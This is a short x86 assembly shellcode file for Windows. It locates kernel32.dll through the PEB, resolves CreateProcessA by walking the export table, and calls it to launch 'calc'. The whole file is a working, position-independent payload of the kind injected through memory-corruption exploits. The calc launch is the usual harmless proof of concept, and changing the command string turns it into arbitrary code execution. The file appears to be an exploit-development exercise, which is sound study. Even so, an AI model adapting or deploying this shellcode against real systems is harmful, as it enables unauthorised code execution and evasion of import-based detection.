global _start

section .text
_start:


getkernel32:
	xor ecx, ecx				; zeroing register ECX
	mul ecx						; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x30]	; PEB loaded in eax
	mov eax, [eax + 0x0c]		; LDR loaded in eax
	mov esi, [eax + 0x14]		; InMemoryOrderModuleList loaded in esi
	lodsd						; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd						; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]		; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]		; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]		; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]		; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getCreateProcessA:
	inc ecx 						; ordinals increment
	lodsd							; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x61657243		; Crea
	jnz getCreateProcessA
	cmp dword [eax + 0x4], 0x72506574	; tePr
	jnz getCreateProcessA
	cmp dword [eax + 0x8], 0x7365636f	; oces
	jnz getCreateProcessA

getCreateProcessAFunc:
	mov esi, [edx + 0x24]		; offset ordinals
	add esi, ebx 				; pointer to the name ordinals table
	mov cx, [esi + ecx * 2] 	; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]    	; ESI = Offset address table
	add esi, ebx             	; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4] 	; EDX = Pointer(offset)
	add edx, ebx             	; EDX = CreateProcessA

	; xor ecx, ecx                ; zero out counter register
    mov cl, 0xff                ; we'll loop 255 times (0xff)
    ; xor edi, edi                ; edi now 0x00000000

    zero_loop:
    push edi                    ; place 0x00000000 on stack 255 times as a way to 'zero memory' 
    loop zero_loop

getcalc:
	push 0x636c6163             ; 'calc'
    mov ecx, esp                ; stack pointer to 'calc'

    push ecx                    ; processinfo pointing to 'calc' as a struct argument
    push ecx                    ; startupinfo pointing to 'calc' as a struct argument
    ; xor eax, eax                ; zero out
    push edi                    ; NULLS
    push edi
    push edi
    push edi
    push edi
    push edi
    push ecx                    ; 'calc'
    push edi
    call edx                    ; call CreateProcessA and spawn calc




